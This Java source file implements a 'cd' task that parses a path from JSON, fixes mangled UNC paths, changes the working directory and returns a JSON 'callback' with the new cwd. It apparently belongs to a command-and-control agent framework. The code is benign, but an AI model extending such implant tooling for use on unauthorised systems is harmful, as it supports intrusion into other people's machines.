package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.woopsie.Config;

import java.io.File;
import java.nio.file.Path;
import java.nio.file.Paths;

/**
 * Change directory task
 */
public class CdTask implements Task {
    
    @Override
    public String execute(Config config, JsonNode parameters) throws Exception {
        Config.debugLog(config, "Executing cd command");
        
        // Parse path from parameters
        String path;
        if (parameters.has("path")) {
            path = parameters.get("path").asText();
        } else if (parameters.isTextual()) {
            path = parameters.asText();
        } else {
            throw new Exception("Missing required parameter: path");
        }
        
        if (path == null || path.trim().isEmpty()) {
            throw new Exception("Path cannot be empty");
        }
        
        // Get current working directory
        String cwd = System.getProperty("user.dir");
        Path currentPath = Paths.get(cwd);
        
        // Resolve the new path
        Path newPath;
        // Detect UNC paths - proper format or malformed single backslash
        boolean isUncPath = path.startsWith("\\\\");
        
        // Also check for malformed UNC paths from JSON parsing: \\host becomes \host
        if (!isUncPath && path.startsWith("\\") && path.length() > 2 && path.charAt(1) != ':') {
            // Fix malformed UNC path by adding missing backslash
            path = "\\" + path;
            isUncPath = true;
            Config.debugLog(config, "Fixed malformed UNC path: " + path);
        }
        
        if (isUncPath || (path.length() > 1 && path.charAt(1) == ':')) {
            // Absolute path (UNC or drive letter)
            newPath = Paths.get(path);
        } else {
            // Relative path - resolve against current directory
            newPath = currentPath.resolve(path).normalize();
        }
        
        // Convert to File and verify it exists and is a directory
        File dir = newPath.toFile();
        
        // For UNC paths, use the original path string for error messages to avoid corruption
        String pathForDisplay = isUncPath ? path : newPath.toAbsolutePath().toString();
        
        if (!dir.exists()) {
            throw new Exception("Directory does not exist: " + pathForDisplay);
        }
        
        if (!dir.isDirectory()) {
            throw new Exception("Path is not a directory: " + pathForDisplay);
        }
        
        // Change the current directory
        // For UNC paths, prefer the canonical path to ensure proper representation
        String absolutePath = isUncPath ? dir.getCanonicalPath() : dir.getAbsolutePath();
        System.setProperty("user.dir", absolutePath);
        
        Config.debugLog(config, "Changed directory to: " + absolutePath);
        
        // Return JSON with callback field containing cwd (matches oopsie format)
        return String.format(
            "{\"user_output\": \"Changed directory to '%s'\", \"callback\": {\"cwd\": \"%s\"}}",
            absolutePath.replace("\\", "\\\\").replace("\"", "\\\""),
            absolutePath.replace("\\", "\\\\").replace("\"", "\\\"")
        );
    }
    
    @Override
    public String getCommandName() {
        return "cd";
    }
}
